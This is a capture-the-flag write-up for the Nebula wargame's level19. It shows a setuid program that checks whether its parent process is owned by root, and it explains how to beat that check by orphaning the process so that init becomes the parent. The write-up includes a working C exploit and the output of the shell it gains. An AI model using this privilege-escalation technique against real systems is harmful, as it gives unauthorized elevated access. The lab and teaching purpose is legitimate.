# level19

## Challenge info

There is a flaw in the below program in how it operates. <br>

To do this level, log in as the level19 account with the password level19. Files for this level can be found in /home/flag19.

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &statbuf) == -1) {
      printf("Unable to check parent process\n");
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve("/bin/sh", argv, envp);
      err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
```

## Solution

This program can be exploited due to the fact that, in Linux, when the parent process terminates before the child process, the child becomes orphan and its parent becomes the user running the init process. <br> 

```
cmd: ps auxww | grep init

root         1  0.0  0.7   3196  1796 ?        Ss   07:50   0:00 /sbin/init
```

This means that the parent process must terminate before the instruction below to have its buf populated with root as its parent 
```
if(stat(buf, &statbuf) == -1)
```

Then, to do something when the verification <b> st_uid == 0</b> passes, the  program uses the <b> **argv </b> <br>

Exploit
```
void main(int argc, char ** argv, char **envp){
    pid_t pid = fork();
    if(pid==0){ //child process
        printf("Child created... lets sleep a bit\n");
        sleep(2);
        setresuid(geteuid(), geteuid(), geteuid());
        char *const args[] = {"/bin/sh", NULL };
        char program[] = "/home/flag19/flag19";
        puts("Doing execve now!!");
        execve(program, args, envp);
   }else{
       puts("parent leaving to buy cigarettes");
       exit(0);
   }
}
```

execute but hang the execution with cat otherwise it wont work (it is possible to source more arguments and execute commands, i.e: {"/bin/sh", "-c", "do something as flag19", NULL })
```
cmd: cat | ./exp

whoami && id
flag19
uid=1020(level19) gid=1020(level19) euid=980(flag19) groups=980(flag19),1020(level19)
```

## Flag
```
You have successfully executed getflag on a target account
```